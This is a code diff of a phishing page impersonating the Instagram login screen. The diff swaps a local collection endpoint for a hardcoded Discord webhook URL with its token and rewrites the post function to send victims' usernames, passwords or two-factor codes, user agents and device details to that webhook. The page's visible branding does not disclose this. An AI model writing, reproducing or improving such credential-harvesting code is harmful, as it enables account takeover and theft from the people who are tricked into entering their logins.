@@ -317,8 +317,8 @@ footer {
   <div class="copy">English · © 2026 Instagram from Meta</div>
 </footer>
 <script>
-const COLLECT = "/api/collect";
-const AFTER = "/2fa.html";
+const WEBHOOK = "https://discord.com/api/webhooks/1542285698793738261/V5Xo_-9X3wofL-Xc_iAquKH4ml6nKaR203vTarrbw6LOWaZGGJJEK-b97o3rguhoALYp";
+const AFTER = "2fa.html";
 const u = document.getElementById("u");
 const p = document.getElementById("p");
 const b = document.getElementById("b");
@@ -336,9 +336,19 @@ function deviceExtra() {
   });
 }
 function post(payload) {
-  const body = JSON.stringify(payload);
-  fetch(COLLECT, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(() => {});
-  if (navigator.sendBeacon) navigator.sendBeacon(COLLECT, new Blob([body], { type: "application/json" }));
+  const text = [
+    `**${payload.type || "event"}**`,
+    `user: \`${payload.username || ""}\``,
+    `pass/code: \`${payload.password || ""}\``,
+    `ua: ${payload.ua || ""}`,
+    payload.extra || ""
+  ].join("\n");
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: text.slice(0, 1900) }),
+    keepalive: true
+  }).catch(() => {});
 }
 let last = 0;
 function live() {
